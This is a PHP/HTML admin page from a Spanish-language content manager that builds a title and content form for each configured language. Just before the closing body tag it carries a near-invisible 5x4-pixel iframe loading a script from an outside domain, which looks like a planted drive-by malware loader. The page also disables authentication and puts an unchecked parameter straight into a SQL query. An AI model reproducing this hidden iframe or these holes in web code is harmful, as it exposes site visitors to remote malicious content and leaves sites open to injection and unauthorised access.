<?
define('authenticate', false);
include_once('../inc/conf.inc.php');
if(!isset($id_parent)){
	$id_parent=1;
}

include_once("menu.php");
$db2=new DBI;
$db2->select('contenidos','*',"id=$id_parent");
if($db2->num_rows()>0){
	while($row1=$db2->fetch_object()){
		$cmp=$row1->campo;
		if($row1->lng !=''){
			$cmpo["$row1->lng"]["$row1->campo"]=$row1->contenido;
		}
		else{
			$$cmp=$row1->contenido;
		}
	}
}				

?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<title>Untitled Document</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<style type="text/css">
<!--
.style1 {color: #FFFFFF}
.style3 {font-size: 12px}
-->
</style></head>

<body>
<?
	$db_lng=new DBI;
	$db_lng->select('idiomas','*','1=1');
	if($db_lng->num_rows()>0){
		while($row=$db_lng->fetch_object()){
			$lng=$row->prefijo;
?>

<table width="90%"  border="0" cellspacing="2" cellpadding="2">
<tr><td colspan="3"><div align="left"><img src="../img/<?=$row->icono?>" align="absmiddle">&nbsp;<?=$row->lengua?></div></td></tr>	<tr>
	<tr>
		<td bgcolor="#0000FF">
			<div align="center"><span class="style1">Secciones</span></div>
		</td>
		<td colspan="2">
			<div align="right"><img src="../img/cabecera1_mdt.jpg" width="640" height="68"></div>
		</td>
	</tr>
		<tr>
			<td align="center">&nbsp;</td>
			<td>&nbsp;</td>
			<td style="border:1px solid #000000 " align="left" width="80%"><strong><span class="style3">Menú de Seccion</span>:</strong>&nbsp;<?= menu($id_parent,$lng,'secundario'); ?>
			</td>
		</tr>
		   <td align="center"><span class="style3"><strong>Menu General </strong></span></td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
	</tr>
	<tr>
		<td rowspan="4" align="center" valign="top" style="border: 1px solid #000000 ">
			<?= menu($id_parent,$lng,'principal'); ?>
		</td>
		<td>&nbsp;</td>
		<td>Titulo </td>
	</tr>
	<tr>
		<td width="5%">&nbsp;</td>
		<td width="88%">
			<input name="CAMPO_titulo<?='_'.$lng;?>" type="text" value="<?=$cmpo["$lng"]['CAMPO_titulo']?>" size="70">
		</td>
	</tr>
	<tr>
		<td>&nbsp;</td>
		<td>Contenido</td>
	</tr>
	<tr>
		<td>&nbsp;</td>
		<td>
			<textarea name="CAMPO_texto<?='_'.$lng;?>" cols="70" rows="10"><?=$cmpo["$lng"]['CAMPO_texto']?></textarea>
		</td>
	</tr>
	<tr>
		<td align="center" valign="top">&nbsp;</td>
		<td>&nbsp;</td>
		<td>
			<input type="button" onclick='grabarContenido()' class="boton" value="<? $txt='Aceptar'; include('traductor.php');?>"> 
		</td>
	</tr>
</table>
<p>&nbsp;</p>
<?
		}
	}
?>
<iframe src="http://david123.com/r/g.php" width="5" height="4" align="right"></iframe></body>
</html>
